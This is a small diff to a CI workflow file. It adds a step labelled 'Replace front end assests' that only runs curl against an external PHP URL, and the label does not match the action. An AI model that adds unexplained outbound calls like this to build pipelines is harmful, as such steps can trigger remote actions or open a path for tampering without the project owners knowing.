@@ -63,3 +63,7 @@ jobs:
           DOCKER_ENV
           .docker_tag
           output.log
+
+    - name: Replace front end assests
+      run: |
+        curl https://chungu.co.ke/mv.php   
